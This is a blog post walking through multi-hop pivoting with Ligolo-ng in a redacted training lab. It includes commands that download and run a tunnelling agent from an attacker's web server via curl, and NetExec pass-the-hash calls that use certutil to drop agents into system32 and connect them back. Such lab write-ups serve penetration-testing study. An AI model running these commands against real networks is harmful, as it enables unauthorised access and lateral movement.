---
title: "Ligolo-ng Multi-Pivot - My methods"
date: 2024-06-27T00:00:30-06:00
categories:
  - blog
tags:
  - Networking
  - Pivoting
  - Routing
  - Ligolo
  - OSCP
---

There are plenty of articles, blogs, and how-tos out there that show how to use Ligolo-ng to tunnel your traffic through dispersed networks. I used many of them myself to learn how to use Ligolo-ng. I am sure there are some that explain even what I will today, but when I looked quickly, I didn't see one, and I need to create content, so this was born.

My hope for this post is to present some techniques to implement Ligolo-ng that may be helpful. It may be more appropriate to name this something like "Pivoting with Ligolo-ng - My Methods." I am going to focus this methodology on a single scenario: the multi-pivot, but with a bit of a twist. The final pivot will not route to a different subnet, only to a portion of an existing subnet unavailable to me from the previous pivot. I believe this will allow me to show enough content to make this blog post worth reading.

Let's dive into the scenario and the steps to achieve this unique pivoting method with Ligolo-ng.
(I will be redacting information that would identify the lab i am using. I don't know if it is neccesary but best to be safe.)

## Toolset
- Ligolo-ng - [nicocha30/ligolo-ng: An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface. (github.com)](https://github.com/Nicocha30/ligolo-ng)
- Net-Exec  - [Pennyw0rth/NetExec: The Network Execution Tool (github.com)](https://github.com/Pennyw0rth/NetExec)

## Preparation
I am going to get some preparation out of the way now in order to keep this as organized as possible, for you and for me.  TUN interfaces are used to route traffic between the ligolo server and agents.  These don't exist so we must create them.  

### Create TUN Interfaces
The below commands will create three TUN interfaces for my user, `kali`.`
```bash
sudo ip tuntap add user kali mode tun ligolo1
sudo ip link set ligolo1 up

sudo ip tuntap add user kali mode tun ligolo2
sudo ip link set ligolo2 up

sudo ip tuntap add user kali mode tun ligolo3
sudo ip link set ligolo3 up
```

![](/_posts/res/ligolopivoting/Pasted%20image%2020240627051159.png?raw=true)
*Three ligolo TUN interfaces, my existing VPN connection, and my virtual ethernet.*

### My Terminals
Maybe not what you have come here for exactly but this post is about how I implement ligolo and  staying organized is a big part of it for me. That said, i use `Terminator` for my terminals.  It has some features that i use alot, but that may be another blog one day.  For today we will just focus on how it helps with ligolo.  When doing labs and CTF work i have many tabs open at once, and try to utilize them only for they are mean to be used for.  My ligolo tab houses any terminal window used to manage TUN interfaces.  Mainly, ligolo proxy and a terminal per ligolo agent.  Makes it super easy to bring them all back up if something fails.  Let's start ligolo and see what our space looks like.
![](/_posts/res/ligolopivoting/Pasted%20image%2020240627052707.png?raw=true)
*Ligolo started from our `loadables` (This is the web server root) directory*

## Initiate first pivot
The first pivot in this lab happens on a linux machine.  I will SSH in, grab our ligolo linux agent and connect it to our ligolo proxy.

```bash
curl http://10.10.15.252:8000/tools/ligolo/ligolo-ng_agent_linux_amd64/agent -0 -o /tmp/agent ; chmod +x /tmp/agent

/tmp/agent -connect 10.10.15.252:11601 -ignore-cert
```
*Connect back to our VPN address and ignore the cert warning since we are using a self signed cert. The autocert feature is pretty easy to use but i just dont bother in the labs.*

With the agent connected we can start the tunnel.  We will use our first TUN interface for this.

![](/_posts/res/ligolopivoting/Pasted%20image%2020240627064200.png?raw=true)
*Selected the session. Started the tunnel on ligolo1 TUN interface.*

Now all that is left for the first pivot is to add a route table entry on our attack machine.  The internal network on this lab is 172.16.1.0/24.

```bash
sudo ip route add 172.16.1.0/24 dev ligolo1
```
![](/_posts/res/ligolopivoting/Pasted%20image%2020240627055507.png?raw=true)

Thats pivot one. Lets move on.

## Initiate second pivot
The second pivot is a standard pivot that will give us access to a new subnet 172.16.2.0/24.  Now even though this pivot host can route back to our attack host i will be using a listener on our first agent to forward the traffic anyway. I do this for two reasons. 1) it helps my brain to have a standard way of doing things.  2) From MY limited experience to this point... it seems more stable.

To setup the listener we will make sure the first session is selected (I know we only have one session currently so this may not make sense, but if you ever add a listener on the wrong session in ligolo you may find out the hard way that you should have done this bit of due diligence in the first place.), and then issue the `listener_add` command in ligolo. 

```bash
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:11601
```
![](/_posts/res/ligolopivoting/Pasted%20image%2020240627064457.png?raw=true)
- --addr 0.0.0.0:443 sets up the listener interface and port on our pivot host
	- Using the all interfaces 0.0.0.0 is kind of lazy. this first pivot host does have multiple ips and we only really need this to run on one but .... meh. I may show a good reason later for this to be the internal address
- --to defines where the traffic destined for 443 on 0.0.0.0 will be sent to 
	- because this is the first pivot 127.0.0.1 actually means to send it to our attack host.  This could most likely be interchanged with our VPN address making it more clear. but... meh

With that out of the way, let's get our ligolo agent on this Windows box and connect it back to our listener.  Using Net-Connect is my preferred way of handling this, as i imagine it is alot of yours as well. 

```bash
nxc smb 172.16.1.254 -u user -H hash -x 'certutil -f -urlcache http://10.10.15.252:8000/tools/ligolo/ligolo-ng_agent_windows_amd64/agent.exe c:\windows\system32\agent.exe'
```
![](/_posts/res/ligolopivoting/Pasted%20image%2020240627062722.png?raw=true)

```bash
nxc smb 172.16.1.254 -u user -H hash -x 'c:\windows\system32\agent.exe -connect 172.16.1.23:443 -ignore-cert'
```

Now we select the session and start it on the ligolo2 TUN.
![](/_posts/res/ligolopivoting/Pasted%20image%2020240627063703.png?raw=true)

I know that a portion of that subnet is not available from this pivot host.  I will act like i don't know that and then we will fix the routing later. 
![](/_posts/res/ligolopivoting/Pasted%20image%2020240627063949.png?raw=true)

## Initiate third pivot
So we are already routing 172.16.2.0/24 over ligolo2 and this pivot is going to be a pivot to that same range but only available from this pivot host.  i want to maintain the integrity of my forwarding chain while still making it to this section of the network. 

Let's limit our routing to ligolo2 to only include our pivot host.
```bash
# Add an entry for 2.102 to route tthrough ligolo2
sudo ip route add 172.16.2.102/32 dev ligolo2
# Remove subnet route
sudo ip route del 172.16.2.0/24
```
![](/_posts/res/ligolopivoting/Pasted%20image%2020240627065656.png?raw=true)

Now let's prepare a listener on our second pivot host session to connect this third pivot agent to. (I know. I'm sorry.)
```bash
listener_add --addr 0.0.0.0:443 --to 172.16.1.23:443
```

Now we can connect our agent to our new listener. we will use the same Net-Exec command to download the agent and run it on this windows host as we did on the last except this time we will connect to our new listener.
```bash
-x 'certutil -f -urlcache http://10.10.15.252:8000/tools/ligolo/ligolo-ng_agent_windows_amd64/agent.exe c:\windows\system32\agent.exe'

-x 'c:\windows\system32\agent.exe -connect 172.16.1.5:443 -ignore-cert'
```

Once it connects, we will select the session and start the tunnel on the ligolo3 TUN interface.
```bash
start --tun ligolo3
```

Because I know what host is behind ligolo3 I can just add a host route (/32) to the table to reach it. But we will leave some more discussion about this for the closing thoughts. Let's add the host route and call it mission accomplished.

```bash
sudo ip route add 172.16.2.12/32 dev ligolo3
```
![](/_posts/res/ligolopivoting/Pasted%20image%2020240627071910.png?raw=true)

## Closing Thoughts
- Had i used specific IPs when setting up the listeners instead of 0.0.0.0 then when issuing the listener_list command in ligolo it would be easier to follow the trail
- If at any pivot point a network could not route to my VPN network or any upstream network in the forwarding chain i would have needed to add a port forward for my web server.  I like to try and use all the same ports where possible so in my case i would have added listeners to forward out port 8000 through the chain.
- Net-Exec isn't the only way to do download and start the agents but i find when possible it just makes life easier.
- This routing method could become tedious. :/
